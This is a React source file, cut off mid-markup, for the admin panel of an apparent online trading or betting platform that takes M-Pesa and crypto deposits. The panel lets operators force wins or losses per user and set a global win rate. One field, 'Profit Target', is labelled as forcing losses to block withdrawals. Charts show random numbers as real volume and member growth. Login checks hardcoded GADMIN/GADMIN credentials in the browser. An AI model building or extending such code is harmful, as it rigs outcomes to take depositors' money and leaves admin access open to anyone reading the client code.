import React, { useState, useEffect, useMemo } from 'react';
import { AreaChart, Area, BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer } from 'recharts';
import { X, Users, TrendingUp, DollarSign, ArrowDownCircle, BarChart2, Pin, PinOff, MessageSquare } from 'lucide-react';

interface AdminDashboardProps {
  isOpen: boolean;
  onClose: () => void;
  theme: 'dark' | 'light';
}

interface User {
  id: string;
  email: string;
  fullName: string;
  demoBalance: number;
  realBalance: number;
  forceOutcome?: string;
  profitTarget?: number;
  maxWinLimit?: number;
  maxLossLimit?: number;
  createdAt: string;
}

interface Stats {
  totalUsers: number;
  totalDeposits: number;
  totalDepositsCount: number;
  totalWithdrawals: number;
  topDepositAmount: number;
}

interface PendingDeposit {
  id: string;
  userId: string;
  amount: number;
  receiptPath?: string;
  message?: string;
  status: string;
  createdAt: string;
}

interface CompletedDeposit {
  txHash: string;
  userId: string;
  amount: number;
  coin: string;
  network: string;
  creditedAt: string;
}

interface Withdrawal {
  id: string;
  userId: string;
  amount: number;
  address: string;
  coin: string;
  network: string;
  status: string;
  createdAt: string;
  paymentMethod?: string;
}

interface GameSettings {
  globalTrendBias: number;
  forceOutcome?: 'win' | 'loss' | '';
  volatilityMultiplier: number;
  realWinRate?: number;
  paybillEnabled?: boolean;
  btcEnabled?: boolean;
  minDeposit?: number;
  minWithdrawal?: number;
  cashoutMode?: 'enabled' | 'disabled' | 'smart';
}

export default function AdminDashboard({ isOpen, onClose, theme }: AdminDashboardProps) {
  const [users, setUsers] = useState<User[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [adminKey, setAdminKey] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginMethod, setLoginMethod] = useState<'creds' | 'key'>('creds');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState<'stats' | 'users' | 'deposits' | 'withdrawals' | 'game' | 'telegram'>('stats');
  const [pendingDeposits, setPendingDeposits] = useState<PendingDeposit[]>([]);
  const [completedDeposits, setCompletedDeposits] = useState<CompletedDeposit[]>([]);
  const [withdrawals, setWithdrawals] = useState<Withdrawal[]>([]);
  const [gameSettings, setGameSettings] = useState<GameSettings>({ 
    globalTrendBias: 0, 
    volatilityMultiplier: 1, 
    realWinRate: 30,
    paybillEnabled: true,
    btcEnabled: true,
    minDeposit: 1,
    minWithdrawal: 10,
    cashoutMode: 'enabled'
  });
  const [isGameLoading, setIsGameLoading] = useState(false);
  const [editingUser, setEditingUser] = useState<User & { newPassword?: string } | null>(null);

  // Telegram states
  const [tgLogs, setTgLogs] = useState<Array<{ id: string; sender: string; text: string; timestamp: string }>>([]);
  const [telegramConfig, setTelegramConfig] = useState<{
    botToken: string;
    groupChatId: string;
    groupLink: string;
    webhookActive: boolean;
    autoInviteDMs: boolean;
    autoSimulateIntervalEnabled: boolean;
    pinnedMessageId?: string | null;
    pinnedMessageText?: string | null;
    pinnedMessageSender?: string | null;
  } | null>(null);
  const [isPinning, setIsPinning] = useState(false);

  // Generate simulated 30-day performance data
  const performanceData = useMemo(() => {
    const data = [];
    let baseVolume = 25000;
    let baseProfit = 1200;
    for (let i = 29; i >= 0; i--) {
      const date = new Date(Date.now() - i * 24 * 60 * 60 * 1000);
      baseVolume = Math.max(5000, baseVolume + (Math.random() - 0.45) * 5000);
      baseProfit = Math.max(200, baseProfit + (Math.random() - 0.45) * 500);
      data.push({
        date: date.toLocaleDateString(undefined, { month: 'short', day: 'numeric' }),
        volume: Math.floor(baseVolume),
        profit: Math.floor(baseProfit)
      });
    }
    return data;
  }, []);

  const telegramGrowthData = useMemo(() => {
    const data = [];
    let baseMembers = 1250;
    for (let i = 29; i >= 0; i--) {
      const date = new Date(Date.now() - i * 24 * 60 * 60 * 1000);
      const newMembers = Math.floor(Math.random() * 50) + 10;
      baseMembers += newMembers;
      data.push({
        date: date.toLocaleDateString(undefined, { month: 'short', day: 'numeric' }),
        newMembers: newMembers,
        totalMembers: baseMembers
      });
    }
    return data;
  }, []);

  // Poll for real-time updates every 10 seconds while authenticated
  useEffect(() => {
    if (!isOpen || !isAuthenticated) return;
    
    const intervalId = setInterval(() => {
      if (activeTab === 'deposits' || activeTab === 'completed_deposits' || activeTab === 'withdrawals') {
        fetch('/api/admin/transactions', { headers: { 'x-admin-key': adminKey } })
          .then(res => res.json())
          .then(data => {
            if (data.success) {
              setPendingDeposits(data.pendingDeposits || []);
              setCompletedDeposits(data.completedDeposits || []);
              setWithdrawals(data.withdrawals || []);
            }
          })
          .catch(() => {});
      }

      if (activeTab === 'telegram') {
        fetch('/api/telegram/config')
          .then(res => res.json())
          .then(data => {
            if (data.config) {
              setTelegramConfig(data.config);
              setTgLogs(data.logs || []);
            }
          })
          .catch(() => {});
      }
    }, 10000);
    return () => clearInterval(intervalId);
  }, [isOpen, isAuthenticated, adminKey, activeTab]);

  const fetchData = async (key: string) => {
    setLoading(true);
    try {
      const [usersRes, statsRes, transRes, gameRes] = await Promise.all([
        fetch('/api/admin/users', { headers: { 'x-admin-key': key } }),
        fetch('/api/admin/stats', { headers: { 'x-admin-key': key } }),
        fetch('/api/admin/transactions', { headers: { 'x-admin-key': key } }),
        fetch('/api/admin/game-settings', { headers: { 'x-admin-key': key } })
      ]);

      if (usersRes.ok && statsRes.ok) {
        const usersData = await usersRes.json();
        const statsData = await statsRes.json();
        const transData = await transRes.json();
        const gameData = await gameRes.json();

        setUsers(usersData.users);
        setStats(statsData.stats);
        setPendingDeposits(transData.pendingDeposits || []);
        setCompletedDeposits(transData.completedDeposits || []);
        setWithdrawals(transData.withdrawals || []);
        setGameSettings(gameData.settings ? { 
          paybillEnabled: true,
          btcEnabled: true,
          minDeposit: 1.00,
          minWithdrawal: 10.00,
          ...gameData.settings, 
          realWinRate: gameData.settings.realWinRate ?? 30 
        } : { 
          globalTrendBias: 0, 
          volatilityMultiplier: 1, 
          realWinRate: 30,
          paybillEnabled: true,
          btcEnabled: true,
          minDeposit: 1.00,
          minWithdrawal: 10.00
        });
        
        // Fetch Telegram configuration and logs
        try {
          const tgRes = await fetch('/api/telegram/config');
          if (tgRes.ok) {
            const tgData = await tgRes.json();
            setTelegramConfig(tgData.config);
            setTgLogs(tgData.logs || []);
          }
        } catch (tgErr) {
          console.error('Error fetching Telegram metadata:', tgErr);
        }

        setIsAuthenticated(true);
      } else {
        alert('Invalid admin key');
      }
    } catch (error) {
      console.error('Error fetching admin data:', error);
      alert('Failed to fetch data');
    } finally {
      setLoading(false);
    }
  };

  const handleUpdateUserDetails = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingUser) return;
    try {
      const res = await fetch('/api/admin/users/update', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey
        },
        body: JSON.stringify({
          userId: editingUser.id,
          email: editingUser.email,
          fullName: editingUser.fullName,
          demoBalance: editingUser.demoBalance,
          realBalance: editingUser.realBalance,
          newPassword: editingUser.newPassword,
          forceOutcome: editingUser.forceOutcome || '',
          profitTarget: editingUser.profitTarget || 0,
          maxWinLimit: editingUser.maxWinLimit || 0,
          maxLossLimit: editingUser.maxLossLimit || 0
        })
      });
      if (res.ok) {
        alert('User details updated successfully');
        setEditingUser(null);
        fetchData(adminKey);
      } else {
        const data = await res.json();
        alert('Failed to update: ' + data.message);
      }
    } catch (error) {
      console.error('Error updating user:', error);
      alert('Failed to update user');
    }
  };

  const handleProcessDeposit = async (id: string, action: 'approve' | 'decline') => {
    if (!confirm(`Are you sure you want to ${action} this deposit?`)) return;

    try {
      const res = await fetch('/api/admin/process-deposit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey
        },
        body: JSON.stringify({ depositId: id, action })
      });

      if (res.ok) {
        setPendingDeposits(prev => prev.filter(d => d.id !== id));
        // Refresh users and stats
        fetchData(adminKey);
      } else {
        alert('Failed to process deposit');
      }
    } catch (error) {
      console.error('Error processing deposit:', error);
    }
  };

  const handleUpdateGameSettings = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsGameLoading(true);
    try {
      const res = await fetch('/api/admin/game-settings', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-admin-key': adminKey
        },
        body: JSON.stringify({ settings: gameSettings })
      });

      if (res.ok) {
        alert('Game settings updated successfully');
      } else {
        alert('Failed to update game settings');
      }
    } catch (error) {
      console.error('Error updating game settings:', error);
    } finally {
      setIsGameLoading(false);
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    let finalKey = adminKey;
    if (loginMethod === 'creds') {
      if (username.trim() === 'GADMIN' && password.trim() === 'GADMIN') {
        finalKey = 'admin-secret-key';
        setAdminKey('admin-secret-key');
      } else {
        alert('Invalid GADMIN Credentials. Access denied.');
        return;
      }
    }
    fetchData(finalKey);
  };

  const handlePinNotification = async (messageId: string) => {
    setIsPinning(true);
    try {
      const res = await fetch('/api/telegram/pin', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ messageId })
      });
      if (res.ok) {
        const data = await res.json();
        setTelegramConfig(data.config);
        setTgLogs(data.logs || []);
      } else {
        alert('Failed to pin notification message.');
      }
    } catch (e) {
      console.error('Pin error:', e);
    } finally {
      setIsPinning(false);
    }
  };

  const handleUnpinNotification = async () => {
    setIsPinning(true);
    try {
      const res = await fetch('/api/telegram/unpin', {
        method: 'POST'
      });
      if (res.ok) {
        const data = await res.json();
        setTelegramConfig(data.config);
        setTgLogs(data.logs || []);
      } else {
        alert('Failed to unpin notification message.');
      }
    } catch (e) {
      console.error('Unpin error:', e);
    } finally {
      setIsPinning(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center overflow-hidden bg-black/45 p-4 transition-all backdrop-blur-sm">
      <div className={`relative w-full max-w-4xl max-h-[90dvh] overflow-y-auto rounded-lg border shadow-2xl transition-all box-border p-6 ${
        theme === 'dark' ? 'bg-slate-950 border-slate-800 text-white' : 'bg-white border-slate-100 text-slate-900'
      }`}>
        <button
          onClick={onClose}
          className="absolute right-4 top-4 rounded p-1.5 text-gray-400 hover:bg-gray-100 hover:text-black transition-colors cursor-pointer"
        >
          <X className="h-4 w-4" />
        </button>

        <h2 className="text-2xl font-bold mb-6 flex items-center gap-2">
          <TrendingUp className="h-6 w-6" />
          Admin Dashboard
        </h2>

        {!isAuthenticated ? (
          <div className="space-y-6 max-w-md">
            {/* Login Mode Tabs */}
            <div className={`flex p-1 rounded-lg max-w-xs gap-1 border ${
              theme === 'dark' ? 'bg-slate-900/65 border-slate-800' : 'bg-slate-100 border-slate-200'
            }`}>
              <button
                type="button"
                onClick={() => setLoginMethod('creds')}
                className={`flex-1 px-3 py-1.5 rounded-md text-[10px] font-black uppercase tracking-wider transition-all cursor-pointer ${
                  loginMethod === 'creds' 
                    ? 'bg-yellow-500 text-slate-950 font-extrabold shadow-sm'
                    : theme === 'dark' ? 'text-slate-400 hover:text-white' : 'text-slate-600 hover:text-slate-900'
                }`}
              >
                GADMIN Login
              </button>
              <button
                type="button"
                onClick={() => setLoginMethod('key')}
                className={`flex-1 px-3 py-1.5 rounded-md text-[10px] font-black uppercase tracking-wider transition-all cursor-pointer ${
                  loginMethod === 'key' 
                    ? 'bg-yellow-500 text-slate-950 font-extrabold shadow-sm'
                    : theme === 'dark' ? 'text-slate-400 hover:text-white' : 'text-slate-600 hover:text-slate-900'
                }`}
              >
                Security Key
              </button>
            </div>

            <form onSubmit={handleLogin} className="space-y-4">
              {loginMethod === 'creds' ? (
                <>
                  <div>
                    <label className="block text-xs font-black uppercase tracking-wider text-slate-400 mb-1.5">
                      Admin Username
                    </label>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="Enter Username (e.g. GADMIN)"
                      required
                      className={`w-full rounded px-3 py-2.5 text-xs font-semibold border transition-all ${
                        theme === 'dark'
                          ? 'bg-slate-900 border-slate-800 text-white focus:border-yellow-500'
                          : 'bg-white border-gray-200 text-black focus:border-yellow-500'
                      }`}
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-black uppercase tracking-wider text-slate-400 mb-1.5">
                      Admin Password
                    </label>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Enter Password (e.g. GADMIN)"
                      required
                      className={`w-full rounded px-3 py-2.5 text-xs font-semibold border transition-all ${
                        theme === 'dark'
                          ? 'bg-slate-900 border-slate-800 text-white focus:border-yellow-500'
                          : 'bg-white border-gray-200 text-black focus:border-yellow-500'
                      }`}
                    />
                  </div>
                </>
              ) : (
                <div>
                  <label className="block text-xs font-black uppercase tracking-wider text-slate-400 mb-1.5">
                    Security Access Key
                  </label>
                  <input
                    type="password"
                    value={adminKey}
                    onChange={(e) => setAdminKey(e.target.value)}
                    placeholder="Enter security access token"
                    required
                    className={`w-full rounded px-3 py-2.5 text-xs font-semibold border transition-all ${
                      theme === 'dark'
                        ? 'bg-slate-900 border-slate-800 text-white focus:border-yellow-500'
                        : 'bg-white border-gray-200 text-black focus:border-yellow-500'
                    }`}
                  />
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-yellow-500 hover:bg-yellow-600 text-slate-950 font-black text-xs uppercase tracking-widest py-3 rounded transition-all disabled:opacity-50 mt-4 cursor-pointer"
              >
                {loading ? 'Authenticating...' : 'Access Admin Panel'}
              </button>
            </form>
          </div>
        ) : (
          <>
            <div className="flex items-center space-x-2 border-b border-slate-800 mb-6 overflow-x-auto pb-2">
              {[
                { id: 'stats', label: 'Overview', icon: TrendingUp },
                { id: 'users', label: 'Users', icon: Users },
                { id: 'deposits', label: 'Pending Deposits', icon: ArrowDownCircle },
                { id: 'completed_deposits', label: 'Completed Deposits', icon: ArrowDownCircle },
                { id: 'withdrawals', label: 'Withdrawals', icon: ArrowDownCircle },
                { id: 'game', label: 'Game Control', icon: DollarSign },
                { id: 'telegram', label: 'Telegram Analytics', icon: BarChart2 }
              ].map(tab => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id as any)}
                  className={`flex items-center gap-1.5 px-4 py-2 text-xs font-bold uppercase whitespace-nowrap transition-all rounded ${
                    activeTab === tab.id
                      ? 'bg-yellow-500 text-slate-950 shadow-lg'
                      : 'text-slate-500 hover:text-white hover:bg-slate-900'
                  }`}
                >
                  <tab.icon className="h-3.5 w-3.5" />
                  {tab.label}
                  {tab.id === 'deposits' && pendingDeposits.length > 0 && (
                    <span className="bg-red-500 text-white text-[8px] px-1 rounded-full">{pendingDeposits.length}</span>
                  )}
                </button>
              ))}
            </div>

            <div className="space-y-8">
              {activeTab === 'stats' && stats && (
                <>
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
                  <div className={`rounded-lg p-4 border ${theme === 'dark' ? 'bg-slate-900 border-slate-800' : 'bg-gray-50 border-gray-200'}`}>
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-xs text-gray-500 font-bold uppercase">Total Users</p>
                        <p className="text-2xl font-bold">{stats.totalUsers}</p>
                      </div>
                      <Users className="h-6 w-6 text-yellow-500" />
                    </div>
                  </div>

                  <div className={`rounded-lg p-4 border ${theme === 'dark' ? 'bg-slate-900 border-slate-800' : 'bg-gray-50 border-gray-200'}`}>
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-xs text-gray-500 font-bold uppercase">Total Deposits</p>
                        <p className="text-2xl font-bold">${stats.totalDeposits.toFixed(2)}</p>
                      </div>
                      <DollarSign className="h-6 w-6 text-green-500" />
                    </div>
                  </div>

                  <div className={`rounded-lg p-4 border ${theme === 'dark' ? 'bg-slate-900 border-slate-800' : 'bg-gray-50 border-gray-200'}`}>
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-xs text-gray-500 font-bold uppercase">Deposit Count</p>
                        <p className="text-2xl font-bold">{stats.totalDepositsCount}</p>
                      </div>
                      <ArrowDownCircle className="h-6 w-6 text-amber-500" />
                    </div>
                  </div>

                  <div className={`rounded-lg p-4 border ${theme === 'dark' ? 'bg-slate-900 border-slate-800' : 'bg-gray-50 border-gray-200'}`}>
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-xs text-gray-500 font-bold uppercase">Withdrawals</p>
                        <p className="text-2xl font-bold">{stats.totalWithdrawals}</p>
                      </div>
                      <TrendingUp className="h-6 w-6 text-violet-500" />
                    </div>
                  </div>

                  <div className={`rounded-lg p-4 border ${theme === 'dark' ? 'bg-slate-900 border-slate-800' : 'bg-gray-50 border-gray-200'}`}>
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-xs text-gray-500 font-bold uppercase">Top Deposit</p>
                        <p className="text-2xl font-bold">${stats.topDepositAmount.toFixed(2)}</p>
                      </div>
                      <DollarSign className="h-6 w-6 text-yellow-500" />
                    </div>
                  </div>
                </div>

                <div className="mt-8 space-y-6">
                  <h3 className="text-lg font-bold">Performance Dashboard (Last 30 Days)</h3>
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    <div className={`p-4 rounded-xl border ${theme === 'dark' ? 'border-slate-800 bg-slate-900/50' : 'border-gray-200 bg-white'}`}>
                      <h4 className="text-sm font-bold text-slate-500 uppercase tracking-wider mb-4">Daily Trade Volume</h4>
                      <div className="h-64">
                        <ResponsiveContainer width="100%" height="100%">
                          <AreaChart data={performanceData} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                            <defs>
                              <linearGradient id="colorVolume" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#8b5cf6" stopOpacity={0.8}/>
                                <stop offset="95%" stopColor="#8b5cf6" stopOpacity={0}/>
                              </linearGradient>
                            </defs>
                            <CartesianGrid strokeDasharray="3 3" vertical={false} stroke={theme === 'dark' ? '#334155' : '#e2e8f0'} />
                            <XAxis dataKey="date" axisLine={false} tickLine={false} tick={{ fontSize: 10, fill: theme === 'dark' ? '#94a3b8' : '#64748b' }} minTickGap={30} />
                            <YAxis axisLine={false} tickLine={false} tick={{ fontSize: 10, fill: theme === 'dark' ? '#94a3b8' : '#64748b' }} />
                            <Tooltip contentStyle={{ backgroundColor: theme === 'dark' ? '#0f172a' : '#fff', borderColor: theme === 'dark' ? '#1e293b' : '#e2e8f0', borderRadius: '8px' }} />
                            <Area type="monotone" dataKey="volume" stroke="#8b5cf6" fillOpacity={1} fill="url(#colorVolume)" />
                          </AreaChart>
                        </ResponsiveContainer>
                      </div>
                    </div>

                    <div className={`p-4 rounded-xl border ${theme === 'dark' ? 'border-slate-800 bg-slate-900/50' : 'border-gray-200 bg-white'}`}>
                      <h4 className="text-sm font-bold text-slate-500 uppercase tracking-wider mb-4">Net Profit</h4>
                      <div className="h-64">
                        <ResponsiveContainer width="100%" height="100%">
                          <AreaChart data={performanceData} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                            <defs>
                              <linearGradient id="colorProfit" x1="0" y1="0" x2="0" y2="1">
                                <stop offset="5%" stopColor="#10b981" stopOpacity={0.8}/>
                                <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                              </linearGradient>
                            </defs>
                            <CartesianGrid strokeDasharray="3 3" vertical={false} stroke={theme === 'dark' ? '#334155' : '#e2e8f0'} />
                            <XAxis dataKey="date" axisLine={false} tickLine={false} tick={{ fontSize: 10, fill: theme === 'dark' ? '#94a3b8' : '#64748b' }} minTickGap={30} />
                            <YAxis axisLine={false} tickLine={false} tick={{ fontSize: 10, fill: theme === 'dark' ? '#94a3b8' : '#64748b' }} />
                            <Tooltip contentStyle={{ backgroundColor: theme === 'dark' ? '#0f172a' : '#fff', borderColor: theme === 'dark' ? '#1e293b' : '#e2e8f0', borderRadius: '8px' }} />
                            <Area type="monotone" dataKey="profit" stroke="#10b981" fillOpacity={1} fill="url(#colorProfit)" />
                          </AreaChart>
                        </ResponsiveContainer>
                      </div>
                    </div>
                  </div>
                </div>
              </>
              )}

              {activeTab === 'users' && (
                <div>
                  <h3 className="text-lg font-bold mb-4">Registered Users</h3>
                  <div className="overflow-x-auto">
                    <table className={`w-full text-sm border-collapse border rounded-lg overflow-hidden ${theme === 'dark' ? 'border-slate-800' : 'border-gray-200'}`}>
                      <thead>
                        <tr className={theme === 'dark' ? 'bg-slate-900' : 'bg-gray-100'}>
                          <th className="border p-3 text-left font-bold">ID</th>
                          <th className="border p-3 text-left font-bold">Email</th>
                          <th className="border p-3 text-left font-bold">Name</th>
                          <th className="border p-3 text-right font-bold">Demo Balance</th>
                          <th className="border p-3 text-right font-bold">Real Balance</th>
                          <th className="border p-3 text-left font-bold">Created</th>
                          <th className="border p-3 text-center font-bold">Actions</th>
                        </tr>
                      </thead>
                      <tbody>
                        {users.map((user) => (
                          <tr key={user.id} className={theme === 'dark' ? 'hover:bg-slate-900/50' : 'hover:bg-gray-50'}>
                            <td className="border p-3 text-xs font-mono">{user.id.substring(0, 8)}...</td>
                            <td className="border p-3 text-xs">{user.email}</td>
                            <td className="border p-3 text-xs">
                              <div className="font-semibold">{user.fullName}</div>
                              <div className="flex flex-wrap gap-1 mt-1">
                                {user.forceOutcome && (
                                  <span className={`px-1 py-0.2 rounded text-[9px] font-bold uppercase leading-none ${user.forceOutcome === 'win' ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-red-500/20 text-red-400 border border-red-500/30'}`}>
                                    Force: {user.forceOutcome}
                                  </span>
                                )}
                                {user.profitTarget && user.profitTarget > 0 ? (
                                  <span className="px-1 py-0.2 rounded text-[9px] font-bold bg-amber-500/20 text-amber-400 border border-amber-500/30 leading-none">
                                    Limit: ${user.profitTarget}
                                  </span>
                                ) : null}
                                {user.maxWinLimit && user.maxWinLimit > 0 ? (
                                  <span className="px-1 py-0.2 rounded text-[9px] font-bold bg-blue-500/20 text-blue-400 border border-blue-500/30 leading-none">
                                    MaxWin: ${user.maxWinLimit}
                                  </span>
                                ) : null}
                                {user.maxLossLimit && user.maxLossLimit > 0 ? (
                                  <span className="px-1 py-0.2 rounded text-[9px] font-bold bg-purple-500/20 text-purple-400 border border-purple-500/30 leading-none">
                                    MaxLoss: ${user.maxLossLimit}
                                  </span>
                                ) : null}
                              </div>
                            </td>
                            <td className="border p-3 text-right font-mono">${user.demoBalance.toFixed(2)}</td>
                            <td className="border p-3 text-right font-mono">${user.realBalance.toFixed(2)}</td>
                            <td className="border p-3 text-xs">{new Date(user.createdAt).toLocaleDateString()}</td>
                            <td className="border p-3 text-center">
                              <button
                                onClick={() => setEditingUser({ ...user, newPassword: '' })}
                                className="bg-yellow-500 hover:bg-yellow-600 text-slate-950 font-bold px-2 py-1 rounded text-[10px] uppercase transition-colors"
                              >
                                Edit
                              </button>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>

                  {/* Edit User Form/Modal Inline */}
                  {editingUser && (
                    <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
                      <div className={`relative w-full max-w-md rounded-lg border p-6 shadow-2xl ${theme === 'dark' ? 'bg-slate-950 border-slate-800' : 'bg-white border-gray-200'}`}>
                        <button
                          onClick={() => setEditingUser(null)}
                          className="absolute right-4 top-4 rounded p-1 text-gray-400 hover:bg-gray-100 dark:hover:bg-slate-800"
                        >
                          <X className="h-4 w-4" />
                        </button>
                        <h3 className="text-lg font-bold mb-4 text-yellow-500">Edit User Details</h3>
                        <form onSubmit={handleUpdateUserDetails} className="space-y-4">
                          <div>
                            <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Email Address</label>
                            <input
                              type="email"
                              value={editingUser.email}
                              onChange={e => setEditingUser({ ...editingUser, email: e.target.value })}
                              className={`w-full rounded px-3 py-2 text-sm border focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                              required
                            />
                          </div>
                          <div>
                            <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Full Name</label>
                            <input
                              type="text"
                              value={editingUser.fullName}
                              onChange={e => setEditingUser({ ...editingUser, fullName: e.target.value })}
                              className={`w-full rounded px-3 py-2 text-sm border focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                              required
                            />
                          </div>
                          <div className="grid grid-cols-2 gap-4">
                            <div>
                              <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Demo Balance</label>
                              <input
                                type="number"
                                step="0.01"
                                value={editingUser.demoBalance}
                                onChange={e => setEditingUser({ ...editingUser, demoBalance: parseFloat(e.target.value) || 0 })}
                                className={`w-full rounded px-3 py-2 text-sm border font-mono focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                                required
                              />
                            </div>
                            <div>
                              <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Real Balance</label>
                              <input
                                type="number"
                                step="0.01"
                                value={editingUser.realBalance}
                                onChange={e => setEditingUser({ ...editingUser, realBalance: parseFloat(e.target.value) || 0 })}
                                className={`w-full rounded px-3 py-2 text-sm border font-mono focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                                required
                              />
                            </div>
                          </div>
                          <div className="grid grid-cols-2 gap-4">
                            <div>
                              <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Force Outcome</label>
                              <select
                                value={editingUser.forceOutcome || ''}
                                onChange={e => setEditingUser({ ...editingUser, forceOutcome: e.target.value })}
                                className={`w-full rounded px-3 py-2 text-sm border focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                              >
                                <option value="">No Override</option>
                                <option value="win">Force Win</option>
                                <option value="loss">Force Loss</option>
                              </select>
                            </div>
                            <div>
                              <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Profit Target (Force Loss to block withdraws)</label>
                              <input
                                type="number"
                                step="0.01"
                                value={editingUser.profitTarget || ''}
                                onChange={e => setEditingUser({ ...editingUser, profitTarget: parseFloat(e.target.value) || 0 })}
                                className={`w-full rounded px-3 py-2 text-sm border font-mono focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                              />
                            </div>
                          </div>
                          <div className="grid grid-cols-2 gap-4">
                            <div>
                              <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Max Trade Win Limit ($) <span className="text-slate-500 font-normal lowercase">(0 = Unlimited)</span></label>
                              <input
                                type="number"
                                step="0.01"
                                value={editingUser.maxWinLimit || ''}
                                onChange={e => setEditingUser({ ...editingUser, maxWinLimit: parseFloat(e.target.value) || 0 })}
                                className={`w-full rounded px-3 py-2 text-sm border font-mono focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                              />
                            </div>
                            <div>
                              <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Max Trade Loss Limit ($) <span className="text-slate-500 font-normal lowercase">(0 = Unlimited)</span></label>
                              <input
                                type="number"
                                step="0.01"
                                value={editingUser.maxLossLimit || ''}
                                onChange={e => setEditingUser({ ...editingUser, maxLossLimit: parseFloat(e.target.value) || 0 })}
                                className={`w-full rounded px-3 py-2 text-sm border font-mono focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                              />
                            </div>
                          </div>
                          <div>
                            <label className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Reset Password <span className="lowercase normal-case font-normal">(Leave blank to keep current)</span></label>
                            <input
                              type="password"
                              placeholder="Enter new password"
                              value={editingUser.newPassword || ''}
                              onChange={e => setEditingUser({ ...editingUser, newPassword: e.target.value })}
                              className={`w-full rounded px-3 py-2 text-sm border focus:outline-none focus:border-yellow-500 ${theme === 'dark' ? 'bg-slate-900 border-slate-800 text-white' : 'bg-white border-gray-300 text-black'}`}
                            />
                          </div>
                          <div className="pt-4">
                            <button
                              type="submit"
                              className="w-full bg-yellow-500 hover:bg-yellow-600 text-slate-950 font-bold py-2.5 rounded text-xs uppercase tracking-wider"
                            >
                              Save Changes
                            </button>
                          </div>
                        </form>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {activeTab === 'deposits' && (
                <div className="space-y-4">
                  <h3 className="text-lg font-bold">Pending M-Pesa Deposits</h3>
                  {pendingDeposits.length === 0 ? (
                    <div className="p-8 text-center text-slate-500 font-bold border border-slate-800 rounded-lg">
                      No pending deposits found.
                    </div>
                  ) : (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      {pendingDeposits.map(d => (
                        <div key={d.id} className="border border-slate-800 rounded-lg p-4 bg-slate-900/50 space-y-3">
                          <div className="flex justify-between items-start">
                            <div>
                              <p className="text-[10px] text-slate-400 font-bold uppercase">User ID / Email</p>
                              <p className="text-sm font-mono truncate max-w-[200px]">{d.userId}</p>
                            </div>
                            <div className="text-right">
                              <p className="text-[10px] text-slate-400 font-bold uppercase">Amount</p>
                              <p className="text-lg font-bold text-green-500">${d.amount}</p>
                            </div>
                          </div>
                          
                          <div>
                            <p className="text-[10px] text-slate-400 font-bold uppercase mb-1">Receipt Preview</p>
                            <a href={d.receiptPath} target="_blank" rel="noopener noreferrer" className="block relative aspect-video bg-black rounded border border-slate-700 overflow-hidden group">
                              <img src={d.receiptPath} alt="Receipt" className="w-full h-full object-cover transition-transform group-hover:scale-105" />
